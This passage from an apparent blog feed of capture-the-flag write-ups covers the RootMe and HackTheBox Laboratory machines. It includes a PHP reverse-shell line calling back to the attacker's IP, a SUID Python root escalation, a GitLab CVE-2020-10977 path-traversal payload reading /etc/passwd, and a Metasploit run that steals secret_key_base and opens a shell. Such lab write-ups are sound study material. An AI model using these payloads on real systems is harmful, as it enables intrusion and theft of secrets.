</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.9.30.115/443 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></div><p>I&rsquo;ll trigger reverse shell by visiting <code> http://10.10.215.165/uploads/iamf.phtml</code> on the browser.</p>
<p><div class="img-container"><img src="imgs/image-20210530105644738.png" alt="image-20210530105644738"  /></div>
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll do the PTY trick to upgrade my shell to interactive one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@rootme:/var/www/html$ which python
</span></span><span class="line"><span class="cl">which python
</span></span><span class="line"><span class="cl">/usr/bin/python
</span></span><span class="line"><span class="cl">www-data@rootme:/var/www/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@rootme:/var/www/html$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">bash-4.4$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> suspended  nc -nvlp <span class="m">443</span>
</span></span><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> continued  nc -nvlp <span class="m">443</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bash-4.4$ 
</span></span></code></pre></div><p>The user flag can be found at <code>/var/www/user.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ find / -type f -user www-data 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc\|sys&#39;</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">/var/www/user.txt
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<p>I find out the current Python binary has SUID bit set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;snap&#39;</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">/usr/bin/python
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><p>Python with SUID can be exploited by executing <code>import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ python -c <span class="s1">&#39;import os; os.execl(&#34;/bin/bash&#34;, &#34;bash&#34;, &#34;-p&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">bash-4.4# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210530111120071.png" alt="image-20210530111120071"  /></div>
</p>
<p>I can grab the root flag now.</p>
<p><div class="img-container"><img src="imgs/image-20210530111235501.png" alt="image-20210530111235501"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Laboratory</title>
      <link>https://fahmifj.github.io/hackthebox/laboratory/</link>
      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/laboratory/</guid>
      <description>LFI to RCE on GitLab 12.8.1~12.9.0</description>
      <content:encoded><![CDATA[<p>Laboratory is features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container reveals a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Arbitrary File Read</li>
<li>Adding Metasploit module</li>
<li>Exploiting GitLab 12.8.1~12.9.0</li>
<li>Recover a git repository</li>
<li>SUID exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Metasploit - Preinstalled in Kali Linux</li>
<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     Apache httpd 2.4.41
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://laboratory.htb/
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: The Laboratory
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-07-05T10:39:28
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2024-03-03T10:39:28
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   <span class="m">2873</span> 91a5 <span class="m">5022</span> f323 4b95 df98 b61a eb6c
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: <span class="m">0875</span> 3a7e eef6 8f50 <span class="m">0349</span> 510d 9fbf abc3 c70a a1ca
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
<p>On the HTTPS port, the certificate discloses a subdomain.</p>
<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
<p>There is nothing really interesting here.</p>
<p><div class="img-container"><img src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  /></div>
</p>
<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
<p>A GitLab instance is presented on this page.</p>
<p><div class="img-container"><img src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  /></div>
</p>
<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
<p><div class="img-container"><img src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  /></div>
</p>
<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
<p><div class="img-container"><img src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  /></div>
</p>
<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
<p><div class="img-container"><img src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ searchsploit gitlab
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- -----------------------------
</span></span><span class="line"><span class="cl">Exploit Title                                                           <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- -----------------------------
</span></span><span class="line"><span class="cl">GitLab - <span class="s1">&#39;impersonate&#39;</span> Feature Privilege Escalation                      <span class="p">|</span> ruby/webapps/40236.txt
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                  <span class="p">|</span> ruby/webapps/49334.py
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                <span class="p">|</span> ruby/webapps/49257.py
</span></span><span class="line"><span class="cl">GitLab 12.9.0 - Arbitrary File Read                                      <span class="p">|</span> ruby/webapps/48431.txt
</span></span><span class="line"><span class="cl">Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                      <span class="p">|</span> ruby/webapps/49076.py
</span></span><span class="line"><span class="cl">Gitlab 6.0 - Persistent Cross-Site Scripting                             <span class="p">|</span> php/webapps/30329.sh
</span></span><span class="line"><span class="cl">Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> linux/remote/34362.rb
</span></span><span class="line"><span class="cl">Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        <span class="p">|</span> java/webapps/47927.txt
</span></span><span class="line"><span class="cl">NPMJS gitlabhook 0.0.17 - <span class="s1">&#39;repository&#39;</span> Remote Command Execution          <span class="p">|</span> json/webapps/47420.txt
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- ------------------------------
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
<blockquote>
<p>CVE-2020-10977:
GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
</blockquote>
<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  /></div>
</p>
<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">![<span class="nt">a</span>](<span class="na">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  /></div>
</p>
<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
<p><div class="img-container"><img src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  /></div>
</p>
<p>The payload will then turn into an attached file.</p>
<p><div class="img-container"><img src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  /></div>
</p>
<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
<p><div class="img-container"><img src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  /></div>
</p>
<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Target        : https://git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Username      : iamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password      : iamfiamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Project Names : ProjectOne, ProjectTwo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Trying to Login...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Login Successful!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating ProjectOne...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ProjectOne Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating ProjectTwo...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ProjectTwo Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>&gt;<span class="o">]</span> Absolute Path to File : /etc/passwd
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating an Issue...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Issue Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Moving Issue...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Issue Moved Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; /etc/passwd
</span></span><span class="line"><span class="cl">----------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">git:x:998:998::/var/opt/gitlab:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
</span></span><span class="line"><span class="cl">gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
</span></span><span class="line"><span class="cl">gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
</span></span><span class="line"><span class="cl">mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
</span></span><span class="line"><span class="cl">registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> /usr/share/metasploit-framework/modules/exploits/multi/http <span class="o">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
</span></span></code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ msfdb reinit
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf_test&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping database user <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Stopping database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating database user <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf_test&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating configuration file <span class="s1">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating initial database schema
</span></span></code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
</span></span></code></pre></div><p>Below are the options needed by the module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> USERNAME iamf
</span></span><span class="line"><span class="cl"><span class="nv">USERNAME</span> <span class="o">=</span>&gt; iamf
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> PASSWORD iamfiamf
</span></span><span class="line"><span class="cl"><span class="nv">PASSWORD</span> <span class="o">=</span>&gt; iamfiamf
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.216
</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.216
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">443</span>
</span></span><span class="line"><span class="cl"><span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">443</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> SSL <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Changing the SSL option’s value may require changing RPORT!
</span></span><span class="line"><span class="cl"><span class="nv">SSL</span> <span class="o">=</span>&gt; <span class="nb">true</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> VHOST git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="nv">VHOST</span> <span class="o">=</span>&gt; git.laboratory.htb
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
</span></span><span class="line"><span class="cl"><span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
</span></span></code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.39:9001 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Logged in to user iamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created issue /iamf/hpt2TORA/issues/1
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing arbitrary file load
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File saved as: <span class="s1">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span class="o">)</span> at 2021-03-21 17:46:14 -0400
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">id<span class="p">;</span>hostname
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
</span></span><span class="line"><span class="cl">git.laboratory.htb
</span></span></code></pre></div><p>I have shell as user <code>git</code>.</p>
<p>There is a <code>.dockerenv</code> file in the root directory, which indicates that I&rsquo;m inside a docker container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ls -la /
</span></span><span class="line"><span class="cl">total <span class="m">88</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .dockerenv
</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root  <span class="m">157</span> Feb <span class="m">24</span>  <span class="m">2020</span> RELEASE
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root <span class="m">4096</span> Feb <span class="m">24</span>  <span class="m">2020</span> assets
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-dexter">Shell as dexter</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~$ grep -Ri dexter 2&gt;/dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securedocker
</span></span><span class="line"><span class="cl">git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securewebsite
</span></span></code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span><span class="line"><span class="cl">total <span class="m">40</span>
